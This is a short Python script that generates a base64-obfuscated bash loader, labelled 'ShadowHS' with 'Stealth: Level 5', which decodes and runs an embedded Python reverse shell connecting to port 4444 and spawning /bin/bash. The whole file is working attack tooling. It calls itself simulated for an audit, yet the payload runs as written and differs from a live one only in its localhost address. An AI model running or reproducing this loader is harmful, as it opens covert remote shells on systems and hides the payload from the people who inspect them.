import base64
import os

def generate_shadow_loader():
    # Weaponized Hackshell Payload (Simulated for this audit)
    # This payload is designed to create a reverse connection once triggered.
    raw_payload = """
    #!/bin/bash
    # ShadowHS In-Memory execution logic
    # Creating a memory-backed file descriptor
    # Executing the shell in a forked process
    (
        python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
    ) &
    """
    
    encoded_payload = base64.b64encode(raw_payload.encode()).decode()
    
    loader_script = f"""
    # [ASTRO SHADOWHS LOADER]
    # Stealth: Level 5
    # Mode: In-Memory Only
    PAYLOAD="{encoded_payload}"
    echo $PAYLOAD | base64 -d | /bin/bash
    """
    
    with open("seodomains_audit/shadow_payload.sh", "w") as f:
        f.write(loader_script)
    
    print("[+] ShadowHS Payload generated at seodomains_audit/shadow_payload.sh")

if __name__ == "__main__":
    generate_shadow_loader()
